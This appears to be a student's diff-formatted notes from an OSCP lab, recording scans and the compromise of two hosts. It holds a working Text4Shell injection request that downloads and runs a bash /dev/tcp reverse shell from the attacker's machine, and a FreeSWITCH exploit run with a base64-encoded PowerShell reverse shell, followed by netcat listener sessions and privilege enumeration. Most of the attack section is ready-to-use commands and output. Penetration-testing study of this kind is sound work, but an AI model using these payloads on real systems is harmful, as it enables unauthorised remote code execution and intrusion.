+OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
+OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
+OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   52.25 ms 192.168.45.1
+2   52.15 ms 192.168.45.254
+3   52.28 ms 192.168.251.1
+4   52.46 ms berlin.oscp.exam (192.168.173.150)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.25 seconds
+    
+┌──(kali㉿kali)-[~/oscpb]
+└─$ feroxbuster -u http://192.168.173.150:8080 
+                                                                                     
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.173.150:8080
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        1l        1w       19c http://192.168.173.150:8080/
+200      GET        1l        1w       25c http://192.168.173.150:8080/search
+500      GET        1l        3w      105c http://192.168.173.150:8080/error
+200      GET        8l       30w      194c http://192.168.173.150:8080/CHANGELOG
+400      GET        1l       31w      800c http://192.168.173.150:8080/plain]
+400      GET        1l       31w      800c http://192.168.173.150:8080/[
+400      GET        1l       31w      800c http://192.168.173.150:8080/]
+400      GET        1l       31w      800c http://192.168.173.150:8080/quote]
+400      GET        1l       31w      800c http://192.168.173.150:8080/extension]
+400      GET        1l       31w      800c http://192.168.173.150:8080/[0-9]
+[####################] - 28s    30002/30002   0s      found:10      errors:0      
+[####################] - 28s    30000/30000   1082/s  http://192.168.173.150:8080/
+
+Going with http://192.168.173.150:8080/CHANGELOG, I found information that I copied to google to find out that the machine is vulnerable to text4shell which enables Remote Code Execution.
+
+Using burp suite, I was able to communicate with the server and the following commands I got a reversed shell on the server.
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ cat rev.sh        
+bash -i >& /dev/tcp/192.168.45.203/443 0>&1 &
+
+#started a python3 server on my kali
+┌──(kali㉿kali)-[~/oscpb]
+└─$ python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+Entered this command via burp
+
+GET /search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.203%2Frev.sh%20-O%20%2Ftmp%2Frev.sh%27)%7D HTTP/1.1 
+
+This downloaded my reverse shell payload.
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.173.150 - - [01/Dec/2024 20:03:54] "GET /rev.sh HTTP/1.1" 200 -
+
+I used this command to make my payload executable
+
+GET /search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27chmod%20a+x%20%2Ftmp%2Frev.sh%27)%7D HTTP/1.1
+
+Then executed with this command.
+GET /search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Frev.sh%27)%7D HTTP/1.1
+
+Got a reverse shell
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.173.150] 47098
+bash: cannot set terminal process group (835): Inappropriate ioctl for device
+bash: no job control in this shell
+dev@oscp:/$ whoami
+whoami
+dev
+dev@oscp:/$ hostname
+hostname
+oscp
+dev@oscp:/$ ifconfig
+ifconfig
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.173.150  netmask 255.255.255.0  broadcast 192.168.173.255
+        ether 00:50:56:9e:7b:4e  txqueuelen 1000  (Ethernet)
+        RX packets 876617  bytes 784899279 (784.8 MB)
+        RX errors 0  dropped 4266  overruns 0  frame 0
+        TX packets 660386  bytes 99344275 (99.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 654  bytes 55162 (55.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 654  bytes 55162 (55.1 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+dev@oscp:/$ ip -br a
+ip -br a
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+ens160           UP             192.168.173.150/24 
+
+
+Th privilege escalation is kept pending for now.
+
+
+.151 machine
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.237.151
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 08:21 CET
+Nmap scan report for 192.168.237.151
+Host is up (0.037s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE          VERSION
+80/tcp   open  http             Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+|_ssl-date: 2024-12-03T07:21:57+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=OSCP
+| Not valid before: 2024-12-02T07:19:46
+|_Not valid after:  2025-06-03T07:19:46
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: OSCP
+|   DNS_Computer_Name: OSCP
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-12-03T07:21:52+00:00
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3
+Aggressive OS guesses: Microsoft Windows XP SP3 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   34.33 ms 192.168.45.1
+2   33.84 ms 192.168.45.254
+3   34.35 ms 192.168.251.1
+4   35.38 ms 192.168.237.151
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
+
+Port 8021 is vulnerable to freeswitch
+
+┌──(kali㉿kali)-[/usr/share]
+└─$ searchsploit freeswitch      
+--------------------------------------------------- ---------------------------------
+ Exploit Title                                     |  Path
+--------------------------------------------------- ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metas | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution              | windows/remote/47799.txt
+--------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Also this exploit url https://www.exploit-db.com/exploits/47799
+
+Downloded the .txt exploit and change it to .py
+┌──(kali㉿kali)-[~/oscpb]
+└─$ mv 47799.txt exploit151.py
+                                                                                     
+┌──(kali㉿kali)-[~/oscpb]
+└─$ chmod a+x exploit151.py 
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ python3 exploit151.py 192.168.237.151 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+Authenticated
+
+──(kali㉿kali)-[~/oscpb]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.196] from (UNKNOWN) [192.168.237.151] 49751
+whoami
+oscp\chris
+PS C:\Program Files\FreeSWITCH> hostname
+OSCP
+PS C:\Program Files\FreeSWITCH> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+PS C:\Program Files\FreeSWITCH> cd ..
+PS C:\Program Files> cd ..
+PS C:\> cd users
+PS C:\users> cd chris
+
+Supposed to go through seeimpersonation for higher privilege, but the machine is having issues.
+
+
+                                                                                     
+
+
+
